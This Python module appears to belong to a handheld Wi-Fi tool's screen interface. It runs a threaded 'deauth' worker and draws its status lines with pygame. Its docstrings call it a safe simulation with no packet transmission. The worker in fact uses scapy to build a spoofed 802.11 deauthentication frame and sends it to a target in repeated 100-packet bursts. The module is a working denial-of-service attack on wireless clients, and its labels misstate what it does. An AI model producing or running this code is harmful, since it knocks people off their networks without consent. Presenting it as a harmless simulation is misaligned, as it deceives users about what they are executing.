import threading
import time
from collections import deque

_STATUS_LINES = deque(maxlen=120)
_STATUS_LOCK = threading.Lock()
_WORKER_LOCK = threading.Lock()
_WORKER_STARTED = False
_WORKER_STOP_EVENT = None
_WORKER_THREAD = None


def _push_status(message):
    import time
    ts = time.strftime("[%H:%M.%S]")
    with _STATUS_LOCK:
        _STATUS_LINES.append(f"{ts} {message}")


def begin_deauth(ap_mac, target_mac, interface):
    """Start a safe simulated deauth status stream (no packet transmission)."""
    global _WORKER_STARTED, _WORKER_STOP_EVENT, _WORKER_THREAD

    with _WORKER_LOCK:
        # Stop any running worker before starting a new one
        if _WORKER_STARTED and _WORKER_STOP_EVENT is not None:
            _WORKER_STOP_EVENT.set()
            _WORKER_STARTED = False
        stop_event = threading.Event()
        _WORKER_STOP_EVENT = stop_event
        _WORKER_STARTED = True

    # Clear old status lines so the new session starts clean
    with _STATUS_LOCK:
        _STATUS_LINES.clear()

    def _worker():
        try:
            _push_status(f"ap={ap_mac}")
            _push_status(f"target={target_mac}")
            _push_status(f"iface={interface}")
            _push_status(f"...starting engine...")
            
            # Import scapy modules inside the function to avoid circular imports
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
            # Build deauth packet
            
            _push_status(f"building deauth packet")
            pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
            
            _push_status(f"deauth packet built, entering send loop")
            while not stop_event.wait(1.0):
                try:
                    # Send deauth packets continuously
                    _push_status(f"sending 100 deauth packets..")
                    sendp(pkt, iface=interface, count=100, inter=0.1, verbose=False)
                    _push_status(f"sent 100 deauth packets")
                    _push_status(f"No EVIL TWIN detected (deauth only)")
                except Exception as e:
                    _push_status(f"send error: {str(e)}")
                    
                # Optional: Add periodic channel hopping
                # if not stop_event.is_set():
                #     time.sleep(0.5)
        finally:
            with _WORKER_LOCK:
                global _WORKER_STARTED, _WORKER_STOP_EVENT, _WORKER_THREAD
                if _WORKER_STOP_EVENT is stop_event:
                    _WORKER_STOP_EVENT = None
                _WORKER_THREAD = None
                _WORKER_STARTED = False
            _push_status("attack stopped")

    worker = threading.Thread(target=_worker, daemon=True)
    with _WORKER_LOCK:
        _WORKER_THREAD = worker
    worker.start()
    return True


def stop_deauth():
    """Stop the simulated deauth status stream."""
    global _WORKER_STARTED

    with _WORKER_LOCK:
        if not _WORKER_STARTED:
            _push_status("simulation already stopped")
            return False
        _WORKER_STARTED = False
        stop_event = _WORKER_STOP_EVENT

    _push_status("stopping simulation")
    if stop_event is not None:
        stop_event.set()
    return True


def render_status(screen, rect, fonts, now, *, text_surf, S, color):
    """Render deauth status lines scrolling upward, newest at bottom."""
    with _STATUS_LOCK:
        lines = list(_STATUS_LINES)

    if not lines:
        lines = ["deauth simulation idle"]

    prev_clip = screen.get_clip()
    screen.set_clip(rect)

    line_h = fonts["sm"].get_height() + 2
    max_visible = max(1, rect.h // line_h)
    visible = lines[-max_visible:]

    # Pin newest line to bottom, older lines above
    for i, line in enumerate(reversed(visible)):
        y = rect.bottom - (i + 1) * line_h
        if y < rect.y:
            break
        surf = text_surf(fonts["sm"], line, color)
        clipped_w = min(surf.get_width(), rect.w - S(4))
        screen.blit(surf.subsurface((0, 0, clipped_w, surf.get_height())), (rect.x + S(4), y))

    screen.set_clip(prev_clip)
